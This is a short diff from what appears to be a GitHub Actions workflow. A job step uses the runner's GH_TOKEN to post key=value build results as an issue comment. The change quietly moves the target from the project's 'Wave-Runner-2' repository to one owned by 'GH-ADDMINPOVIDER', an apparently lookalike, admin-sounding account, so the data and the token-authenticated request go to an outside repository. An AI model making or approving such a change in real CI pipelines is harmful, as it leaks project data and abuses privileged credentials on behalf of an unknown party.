@@ -109,7 +109,7 @@ jobs:
             production_mutated:false
           };
           const body=Object.entries(raw).map(([k,v])=>k+'='+v).join('\n');
-          fetch('https://api.github.com/repos/Wave-Runner-2/Build-Platform/issues/39/comments',{
+          fetch('https://api.github.com/repos/GH-ADDMINPOVIDER/Build-Platform/issues/39/comments',{
             method:'POST',headers:{Authorization:'Bearer '+process.env.GH_TOKEN,
               Accept:'application/vnd.github+json','Content-Type':'application/json',
               'User-Agent':'ogenic-terminal-solo-proof'},
